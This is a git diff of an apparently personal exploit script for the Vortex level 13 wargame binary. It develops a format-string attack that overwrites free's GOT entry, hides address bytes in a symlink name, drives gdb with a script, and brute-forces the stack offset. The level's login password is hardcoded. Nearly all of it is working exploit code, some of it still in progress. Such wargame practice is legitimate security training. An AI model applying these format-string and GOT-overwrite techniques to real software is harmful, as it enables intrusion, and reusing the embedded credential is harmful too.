@@ -118,6 +118,7 @@ def upload(s, content, remote_path):
 
 
 gdb_script = '''
+set follow-fork-mode child
 set disassembly-flavor intel   
 alias gil = disassemble
 
@@ -125,31 +126,73 @@ alias gil = disassemble
 #alias gilr = 'x/2wx $ebp'
 
 
-b *exit
+# break at main
+b *main
+# run wrapper with symlink as arg, pipe input later into forked vortex process
+r `cat /tmp/docgil-raw` < /tmp/docgil
 
-# printf call in vuln
+b *execve
+c
+si
+si
+del
+break *main
+
+c
+# now in main from vortex prog
+
+
+# # char checking 
+# break *0x080485f7
+# commands
+# shell echo "checking char at index"
+# i r edx
+# shell echo "press c to continue"
+# end
+
+b *exit
 b *printf
-finish
-shell sleep 1
-r < /tmp/docgil
+
+# c
+# brings us to char checking breakpoint
+
+# before free now
 '''
 
 s = connect_to_local("13", "jMyg12=nB", remote=False)
 # s = connect("13", "jMyg12=nB")
 cmd = "gdb -x /tmp/gdb /vortex/vortex13"
 wrapper_path = local_dir + "/vortex/wrapper"
-remote_payload_path = "/tmp/docgil"
+remote_payload_path = "/tmp/docgil-raw"
+remote_format_payload_path = "/tmp/docgil"
 if LOCAL:
     remote_gdb_script_path = local_dir + "/vortex/gdb.script"
 else:
     remote_gdb_script_path = "/tmp/gdb"
 
 vuln_start_adr = 0x08048593
-free_got = 0x804a010
+free_got = 0x0804a010
 printf_got = 0x804a00c
 system = libc.symbols["system"]
 
+log.info("############################################################################################################################################################")
+log.info("# Init payload symlink file")
+log.info("############################################################################################################################################################")
 
+
+payload = b""
+payload += b"A" * 17
+payload += pack(free_got, 32)
+payload += b"a"
+
+
+symlink = payload
+
+s.set_working_directory(bytes(CWD,"utf-8"))
+s.ln(['-s', BINARY_PATH, symlink])
+
+upload(s, gdb_script, remote_gdb_script_path)
+upload(s, payload, remote_payload_path)
 
 log.info(
     "############################################################################################################################################################")
@@ -157,29 +200,26 @@ log.info("# find hammerlen")
 log.info(
     "############################################################################################################################################################")
 
+
+
 found_one = False
 off_until_buf = None
-for i in range(150):
+for i in range(1500):
     break
     log.info(f"i: {i}")
-    payload = b""
-    payload += b"A"*4
-    payload += b"%" + bytes(str(i), "utf-8") + b"$s"
-    # payload += b"%" + bytes(str(i + 1), "utf-8") + b"$c"
-    # payload += b"%" + bytes(str(i + 2), "utf-8") + b"$p"
-    # payload += b"%" + bytes(str(i + 3), "utf-8") + b"$p"
-    payload = pad(payload, 0x14)
+    f_payload = b""
+    f_payload += b"%" + bytes(str(i), "utf-8") + b"$s"
+    f_payload = pad(f_payload, 0x14)
 
-    upload(s, gdb_script, remote_gdb_script_path)
-    upload(s, payload, remote_payload_path)
+    upload(s, f_payload, remote_format_payload_path)
 
-    io = s.process([wrapper_path, BINARY_PATH])
-    io.send(payload)
+    io = s.process([wrapper_path, symlink])
+    io.send(f_payload)
     r = io.recvall()
     log.info(f"r: {r}")
 
     # if r.count(b"41") >= 2:
-    if r.count(b"A") >= 2+4:
+    if r.count(b"A") >= 4:
         log.info(f"found index, start of buf at {i}")
         off_until_buf = i
         break
@@ -190,18 +230,28 @@ log.info("######################################################################
 log.info("# overwrite free's got")
 log.info("############################################################################################################################################################")
 
+# allowed = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%.$\n"
+# a = []
+# for c in allowed:
+#     a.append(ord(c))
+# print(a)
 
 off_until_buf = 7
 
-payload = b""
-payload += pack(free_got, 32)
-payload += b"%" + bytes(str(off_until_buf), "utf-8") + b"$100n"
-payload = pad(payload, 0x14)
+# payload = b""
+# payload += pack(free_got, 32)
+# payload += b"%" + bytes(str(off_until_buf), "utf-8") + b"$100n"
+# payload = pad(payload, 0x14)
 
-upload(s, gdb_script, remote_gdb_script_path)
-upload(s, payload, remote_payload_path)
 
-io = s.process([wrapper_path, BINARY_PATH])
+format_payload = b""
+format_payload += b"%" + bytes(str(off_until_buf), "utf-8") + b"$100n"
+format_payload = pad(format_payload, 0x14)
+
+
+upload(s, format_payload, remote_format_payload_path)
+
+io = s.process([wrapper_path, symlink])
 io.send(payload)
 r = io.recvall()
 log.info(f"r: {r}")
